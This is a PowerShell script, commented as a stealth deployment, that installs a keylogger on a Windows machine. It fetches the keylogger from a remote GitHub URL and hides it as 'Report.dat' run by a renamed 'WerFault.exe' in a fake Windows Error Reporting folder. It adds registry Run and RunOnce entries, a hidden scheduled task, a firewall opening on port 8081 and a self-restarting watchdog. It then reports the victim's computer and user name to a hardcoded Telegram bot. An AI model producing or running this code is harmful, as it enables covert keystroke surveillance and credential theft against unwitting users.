# Stealth deployment - harder to detect and remove

# Stop any existing instances first
Stop-Process -Name pythonw,python,WerFault -Force -ErrorAction SilentlyContinue

$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
$TelegramChatId = "1587027869"

# Configure power settings (silent)
powercfg /change monitor-timeout-ac 0 2>$null
powercfg /change disk-timeout-ac 0 2>$null
powercfg /change standby-timeout-ac 0 2>$null
powercfg /change hibernate-timeout-ac 0 2>$null

# Ensure Python is installed
$py = "C:\Program Files\Python311\python.exe"
$pyw = "C:\Program Files\Python311\pythonw.exe"

if (-not (Test-Path $py)) {
    $installer = "$env:TEMP\py.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $installer -UseBasicParsing
    Start-Process $installer -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_pip=1" -Wait
    Remove-Item $installer -Force
    Start-Sleep 5
}

# Install packages
& $py -m pip install keyboard flask flask-socketio eventlet --quiet --disable-pip-version-check 2>$null

# Create stealth directory (looks like Windows system folder)
$stealthDir = "$env:ProgramData\Microsoft\Windows\WER\ReportQueue"
if (-not (Test-Path $stealthDir)) {
    New-Item -ItemType Directory -Path $stealthDir -Force | Out-Null
}

# Copy Python executable with innocent name
$stealthPy = "$stealthDir\WerFault.exe"
Copy-Item $pyw $stealthPy -Force

# Download keylogger with innocent name
$keyloggerPath = "$stealthDir\Report.dat"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-working.py" -OutFile $keyloggerPath -UseBasicParsing

# Create startup entry in multiple places for persistence
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name "Windows Error Reporting" -Value "`"$stealthPy`" `"$keyloggerPath`"" -ErrorAction SilentlyContinue

# Also add to RunOnce for extra persistence
$runOnceKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Set-ItemProperty -Path $runOnceKey -Name "WER" -Value "`"$stealthPy`" `"$keyloggerPath`"" -ErrorAction SilentlyContinue

# Create scheduled task with innocent name
$action = New-ScheduledTaskAction -Execute $stealthPy -Argument $keyloggerPath
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)

Register-ScheduledTask -TaskName "Windows Error Reporting Service" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

# Add firewall rule with innocent name
New-NetFirewallRule -DisplayName "Windows Error Reporting" -Direction Inbound -Protocol TCP -LocalPort 8081 -Action Allow -ErrorAction SilentlyContinue | Out-Null

# Start now with RunLevel Highest (admin rights for keyboard hook)
Start-Process $stealthPy -ArgumentList $keyloggerPath -WindowStyle Hidden

# Create self-healing script (restarts if killed)
$watchdogPath = "$stealthDir\watchdog.ps1"
$watchdogScript = @"
while (`$true) {
    `$proc = Get-Process | Where-Object { `$_.Path -eq '$stealthPy' }
    if (-not `$proc) {
        Start-Process '$stealthPy' -ArgumentList '$keyloggerPath' -WindowStyle Hidden
    }
    Start-Sleep 30
}
"@
$watchdogScript | Out-File -FilePath $watchdogPath -Encoding UTF8

# Start watchdog in hidden background
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $watchdogPath" -WindowStyle Hidden

# Send Telegram notification
$message = "✅ STEALTH DEPLOYMENT COMPLETE`n`nComputer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`nKeylogger: Running (port 8081)`nProcess: WerFault.exe`nStatus: Hidden & Protected"

try {
    $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
    $body = @{ chat_id = $TelegramChatId; text = $message }
    Invoke-RestMethod -Uri $uri -Method Post -Body $body -UseBasicParsing | Out-Null
} catch {}

Write-Output "Stealth deployment complete. Process hidden as WerFault.exe"
